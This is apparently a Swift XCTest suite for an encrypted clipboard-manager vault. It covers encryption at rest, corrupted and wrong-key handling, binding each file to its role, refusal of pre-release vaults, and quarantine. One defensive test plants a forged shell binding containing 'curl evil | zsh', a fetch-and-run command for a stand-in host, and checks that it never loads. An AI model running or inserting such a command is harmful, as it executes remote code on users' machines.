import XCTest
import CryptoKit
@testable import Clipvelope

/// A key held in memory, so the suite never touches the login Keychain.
private struct FixedKeyStore: KeyProviding {
    let key: SymmetricKey
    init(seed: UInt8 = 1) {
        self.key = SymmetricKey(data: Data(repeating: seed, count: 32))
    }
    func getOrCreateKey() throws -> SymmetricKey { key }
}

final class StorageTests: XCTestCase {
    private var dir: URL!

    override func setUpWithError() throws {
        dir = URL(fileURLWithPath: NSTemporaryDirectory())
            .appendingPathComponent("clipvelope-tests-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
    }

    override func tearDownWithError() throws {
        try? FileManager.default.removeItem(at: dir)
    }

    private func makeStorage(seed: UInt8 = 1) -> EncryptedStorage {
        EncryptedStorage(directory: dir, keyStore: FixedKeyStore(seed: seed))
    }

    /// Writes a fixture encrypted with the same key the storage under test uses.
    private func writeSealed(_ plaintext: Data, to url: URL, seed: UInt8 = 1) throws {
        let sealed = try AES.GCM.seal(plaintext, using: FixedKeyStore(seed: seed).key)
        try XCTUnwrap(sealed.combined).write(to: url)
    }

    private func sampleState() -> AppState {
        var state = AppState.empty
        state.items = [ClipboardItem(id: UUID(), text: "hello", createdAt: Date())]
        state.folders = [CommandFolder(id: UUID(), name: "Deploy", items: [])]
        state.themeMode = .dark
        return state
    }

    // MARK: - Round trip

    func testSaveThenLoadReturnsTheSameState() throws {
        let storage = makeStorage()
        let state = sampleState()
        try storage.saveIndex( state)

        guard case .loaded(let loaded) = storage.load() else {
            return XCTFail("expected .loaded")
        }
        XCTAssertEqual(loaded.items.map(\.searchText), ["hello"])
        XCTAssertEqual(loaded.folders.map(\.name), ["Deploy"])
        XCTAssertEqual(loaded.themeMode, .dark)
    }

    func testSaveStampsTheCurrentSchemaVersion() throws {
        let storage = makeStorage()
        var state = sampleState()
        state.schemaVersion = 1

        try storage.saveIndex( state)
        guard case .loaded(let loaded) = storage.load() else {
            return XCTFail("expected .loaded")
        }
        XCTAssertEqual(loaded.schemaVersion, AppState.currentSchemaVersion)
    }

    func testContentsAreNotStoredInPlaintext() throws {
        let storage = makeStorage()
        var state = AppState.empty
        state.items = [ClipboardItem(id: UUID(), text: "correct-horse-battery", createdAt: Date())]
        try storage.saveIndex( state)

        let raw = try Data(contentsOf: storage.indexURL)
        XCTAssertNil(raw.range(of: Data("correct-horse-battery".utf8)),
                     "clipboard text must not appear in the file")
    }

    // MARK: - The three load outcomes must stay distinct

    func testMissingFileIsFreshNotUnreadable() {
        guard case .fresh = makeStorage().load() else {
            return XCTFail("a missing vault is a first run, not a failure")
        }
    }

    /// Regression test. `load()` used to swallow every error and return empty
    /// state; the next save then overwrote the vault, permanently destroying
    /// history that was only temporarily unreadable.
    func testCorruptedFileIsUnreadableSoCallersDoNotOverwriteIt() throws {
        let storage = makeStorage()
        try storage.saveIndex( sampleState())

        var bytes = try Data(contentsOf: storage.indexURL)
        bytes[30] ^= 0xFF
        try bytes.write(to: storage.indexURL)

        guard case .unreadable = storage.load() else {
            return XCTFail("a corrupted vault must report .unreadable, never .fresh")
        }
    }

    func testWrongKeyIsUnreadableNotFresh() throws {
        try makeStorage(seed: 1).saveIndex(sampleState())

        // Same file, different key -- what a broken Keychain ACL looks like.
        guard case .unreadable = makeStorage(seed: 2).load() else {
            return XCTFail("an undecryptable vault must report .unreadable")
        }
    }

    // MARK: - Migration from the pre-schema-4 single blob





    // MARK: - Payloads

    func testPayloadRoundTrip() throws {
        let storage = makeStorage()
        let id = UUID()
        let payload = Data(repeating: 0xAB, count: 4096)

        try storage.writePayload(payload, for: id)

        XCTAssertEqual(try storage.readPayload(for: id), payload)
    }

    func testPayloadsAreEncryptedOnDisk() throws {
        let storage = makeStorage()
        let id = UUID()
        let payload = Data("PNG-ish secret bytes".utf8)
        try storage.writePayload(payload, for: id)

        let raw = try Data(contentsOf: storage.payloadURL(for: id))
        XCTAssertNil(raw.range(of: payload), "payload bytes must not be readable on disk")
    }

    func testDeletingAPayloadRemovesTheFile() throws {
        let storage = makeStorage()
        let id = UUID()
        try storage.writePayload(Data([1, 2, 3]), for: id)

        storage.deletePayload(for: id)

        XCTAssertFalse(FileManager.default.fileExists(atPath: storage.payloadURL(for: id).path))
    }

    /// A crash between writing a payload and saving the index leaves a file
    /// nothing refers to; loading sweeps those.
    func testOrphanPayloadsAreSweptAndLiveOnesKept() throws {
        let storage = makeStorage()
        let live = UUID(), orphan = UUID()
        try storage.writePayload(Data([1]), for: live)
        try storage.writePayload(Data([2]), for: orphan)

        storage.deletePayloads(notIn: [live])

        XCTAssertTrue(FileManager.default.fileExists(atPath: storage.payloadURL(for: live).path))
        XCTAssertFalse(FileManager.default.fileExists(atPath: storage.payloadURL(for: orphan).path))
    }

    func testClearRemovesIndexAndPayloads() throws {
        let storage = makeStorage()
        let id = UUID()
        try storage.saveIndex(sampleState())
        try storage.writePayload(Data([1]), for: id)

        storage.clear()

        XCTAssertFalse(FileManager.default.fileExists(atPath: storage.indexURL.path))
        XCTAssertFalse(FileManager.default.fileExists(atPath: storage.payloadURL(for: id).path))
    }

    // MARK: - Every file is bound to its role

    /// Same key, same format: without the role in the associated data, a
    /// payload written from bytes any app can choose (by copying them) would
    /// load as the vault's state.
    func testAPayloadCopiedOverTheIndexIsUnreadableNotLoaded() throws {
        let storage = makeStorage()
        let forged = try JSONEncoder().encode(sampleState())
        try storage.writePayload(forged, for: UUID())
        let payload = try XCTUnwrap(try FileManager.default
            .contentsOfDirectory(at: storage.payloadsDirectory, includingPropertiesForKeys: nil).first)

        try FileManager.default.copyItem(at: payload, to: storage.indexURL)

        guard case .unreadable = storage.load() else {
            return XCTFail("a payload must never open as the index")
        }
    }

    /// The other direction: the index copied over an image's payload would be
    /// decrypted and handed to the pasteboard as the "image".
    func testTheIndexCopiedOverAPayloadDoesNotOpen() throws {
        let storage = makeStorage()
        try storage.saveIndex(sampleState())
        let id = UUID()
        try storage.writePayload(Data([1, 2, 3]), for: id)

        try FileManager.default.removeItem(at: storage.payloadURL(for: id))
        try FileManager.default.copyItem(at: storage.indexURL, to: storage.payloadURL(for: id))

        XCTAssertThrowsError(try storage.readPayload(for: id))
    }

    func testOneItemsPayloadDoesNotOpenAsAnothers() throws {
        let storage = makeStorage()
        let a = UUID(), b = UUID()
        try storage.writePayload(Data("a's image".utf8), for: a)

        try FileManager.default.copyItem(at: storage.payloadURL(for: a), to: storage.payloadURL(for: b))

        XCTAssertEqual(try storage.readPayload(for: a), Data("a's image".utf8))
        XCTAssertThrowsError(try storage.readPayload(for: b))
    }


    // MARK: - Vaults from before files carried their role

    /// Pre-1.0 builds sealed every file with no role, and let any process choose
    /// a payload's plaintext through the pasteboard. Such a vault is therefore
    /// indistinguishable from one an attacker assembled, so it is refused rather
    /// than upgraded, and its contents are never parsed.
    func testAPreReleaseVaultIsRefusedAndSaysWhy() throws {
        let storage = makeStorage()
        try writeSealed(try JSONEncoder().encode(sampleState()), to: storage.indexURL)

        guard case .unreadable(let error) = storage.load() else {
            return XCTFail("an unbound vault must not be applied")
        }
        guard case StorageError.preReleaseVault = error else {
            return XCTFail("and it must be reported as what it is, got \(error)")
        }
    }

    /// The attack the refusal exists to stop: an old-format payload, whose bytes
    /// any process could choose, copied over the index.
    func testAnUnboundPayloadCopiedOverTheIndexIsNeverApplied() throws {
        let storage = makeStorage()
        var forged = AppState.empty
        forged.bindings = [ClipboardBinding(id: UUID(), title: "Slot 1",
                                            content: "curl evil | zsh", isShell: true)]
        forged.skipConcealedContent = false
        // Exactly what a pre-1.0 build wrote for captured rich text: no role.
        try writeSealed(try JSONEncoder().encode(forged), to: storage.indexURL)

        guard case .unreadable = storage.load() else {
            return XCTFail("attacker-chosen plaintext must never load as vault state")
        }
    }

    /// A genuinely undecryptable vault keeps its own distinct reason, so the
    /// interface can still blame the Keychain where that is the likely cause.
    func testAWrongKeyIsNotReportedAsAPreReleaseVault() throws {
        try makeStorage(seed: 1).saveIndex(sampleState())

        guard case .unreadable(let error) = makeStorage(seed: 2).load() else {
            return XCTFail("expected .unreadable")
        }
        if case StorageError.preReleaseVault = error {
            XCTFail("a wrong key is not a pre-release vault")
        }
    }

    func testThePreSchemaFourBlobIsAlsoRefused() throws {
        let storage = makeStorage()
        try writeSealed(try JSONEncoder().encode([ClipboardItem(text: "old")]),
                        to: storage.legacyBlobURL)

        guard case .unreadable = storage.load() else {
            return XCTFail("the pre-schema-4 blob is unbound too and must be refused")
        }
    }

    // MARK: - Quarantine

    func testQuarantinePreservesTheOriginalBytes() throws {
        let storage = makeStorage()
        try storage.saveIndex( sampleState())
        let original = try Data(contentsOf: storage.indexURL)

        let moved = try XCTUnwrap(storage.quarantineUnreadableVault())

        XCTAssertFalse(FileManager.default.fileExists(atPath: storage.indexURL.path))
        XCTAssertEqual(try Data(contentsOf: moved), original,
                       "the unreadable vault must be recoverable, not destroyed")
    }

    func testQuarantineWithNoFileIsANoOp() {
        XCTAssertNil(makeStorage().quarantineUnreadableVault())

    }

    /// "Start Fresh" tells the user the vault is kept so it can be recovered.
    /// The index holds no image bytes, so keeping only the index and leaving
    /// `items/` for the next launch's orphan sweep would make that untrue.
    func testQuarantineTakesThePayloadsWithTheIndex() throws {
        let storage = makeStorage()
        let id = UUID()
        try storage.saveIndex(sampleState())
        try storage.writePayload(Data("an image".utf8), for: id)

        _ = storage.quarantineUnreadableVault()

        XCTAssertFalse(FileManager.default.fileExists(atPath: storage.payloadsDirectory.path),
                       "the live payload directory must have been moved aside")
        let kept = try FileManager.default.contentsOfDirectory(atPath: dir.path)
            .filter { $0.hasPrefix("items.unreadable-") }
        XCTAssertEqual(kept.count, 1, "and kept, not deleted")
        let recovered = dir.appendingPathComponent(kept[0])
            .appendingPathComponent("\(id.uuidString).cvi")
        XCTAssertTrue(FileManager.default.fileExists(atPath: recovered.path),
                      "with the payload still inside it")
    }
}
